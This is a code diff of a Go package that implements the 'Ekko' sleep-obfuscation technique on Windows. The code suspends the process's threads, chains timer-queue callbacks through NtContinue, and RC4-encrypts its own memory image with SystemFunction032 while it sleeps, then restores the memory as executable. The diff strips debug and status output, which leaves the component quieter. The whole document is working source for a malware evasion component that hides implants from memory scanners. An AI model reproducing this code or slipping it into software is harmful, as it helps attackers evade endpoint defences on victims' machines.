@@ -1,7 +1,6 @@
 package ekko
 
 import (
-	"fmt"
 	"log"
 	"syscall"
 	"unsafe"
@@ -42,7 +41,6 @@ var (
 func EkkoSleep(sleepTime uint64) error {
 
 	currentProcessID := uint32(windows.GetCurrentProcessId())
-	fmt.Printf("Current Process ID: %d\n", currentProcessID)
 
 	// Take a snapshot of all running threads in the system
 	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
@@ -60,12 +58,10 @@ func EkkoSleep(sleepTime uint64) error {
 		return err
 	}
 
-	fmt.Println("[+] Suspending Threads")
 	for {
 		if te32.OwnerProcessID == currentProcessID {
 
 			if windows.GetCurrentThreadId() != te32.ThreadID {
-				//fmt.Println(te32.ThreadID)
 
 				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
 				if err != nil {
@@ -97,7 +93,6 @@ func EkkoSleep(sleepTime uint64) error {
 		}
 	}
 
-	fmt.Println("[+] Threads Suspended")
 
 	te32.Size = uint32(unsafe.Sizeof(te32))
 	err = windows.Thread32First(hThreadSnapshot, &te32)
@@ -106,19 +101,14 @@ func EkkoSleep(sleepTime uint64) error {
 	}
 
 	err = ekko(sleepTime)
-	if err != nil {
-		fmt.Printf("[ERROR] Ekko Sleep failed %v\n", err)
-	}
 	error2 := err
 
-	fmt.Println("[+] Resume Suspended Threads")
 
 	// resume threads
 	for {
 		if te32.OwnerProcessID == currentProcessID {
 
 			if windows.GetCurrentThreadId() != te32.ThreadID {
-				//fmt.Println(te32.ThreadID)
 
 				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
 				if err != nil {
@@ -138,7 +128,6 @@ func EkkoSleep(sleepTime uint64) error {
 		}
 	}
 
-	fmt.Println("Suspended Threads resumed")
 	if error2 != nil {
 		return error2
 	}
@@ -175,7 +164,6 @@ func ekko(sleepTime uint64) error {
 
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
 	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)
-	//fmt.Println(CtxThread)
 
 	if CtxThread.Rip == 0 {
 		log.Fatalln()
@@ -194,25 +182,21 @@ func ekko(sleepTime uint64) error {
 	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
 	RopProtRW.R8 = windows.PAGE_READWRITE
 	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
-	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRW.Rip, RopProtRW.Rcx, RopProtRW.Rdx, RopProtRW.R8, RopProtRW.R9)
 
 	RopMemEnc.Rsp -= 8
 	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
 	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
 	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
-	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemEnc.Rip, RopMemEnc.Rcx, RopMemEnc.Rdx, 0, 0)
 
 	RopDelay.Rsp -= 8
 	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
 	RopDelay.Rcx = uint64(windows.CurrentProcess())
 	RopDelay.Rdx = sleepTime
-	//fmt.Printf("\n[DEBUG] WaitForSingleObject: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopDelay.Rip, RopDelay.Rcx, RopDelay.Rdx, 0, 0)
 
 	RopMemDec.Rsp -= 8
 	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
 	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
 	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
-	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemDec.Rip, RopMemDec.Rcx, RopMemDec.Rdx, 0, 0)
 
 	RopProtRX.Rsp -= 8
 	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
@@ -220,7 +204,6 @@ func ekko(sleepTime uint64) error {
 	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
 	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
 	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
-	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRX.Rip, RopProtRX.Rcx, RopProtRX.Rdx, RopProtRX.R8, RopProtRX.R9)
 
 	// SetEvent( hEvent );
 	RopSetEvt.Rsp -= 8
@@ -234,10 +217,8 @@ func ekko(sleepTime uint64) error {
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)
 
-	fmt.Printf("[+] Encrypt and sleep for %d ms\n", sleepTime)
 	windows.WaitForSingleObject(windows.Handle(hEvent), windows.INFINITE)
 	procDeleteTimerQueue.Call(hTimerQueue)
-	fmt.Println("[+] Decrypted and awake")
 
 	return nil
 }
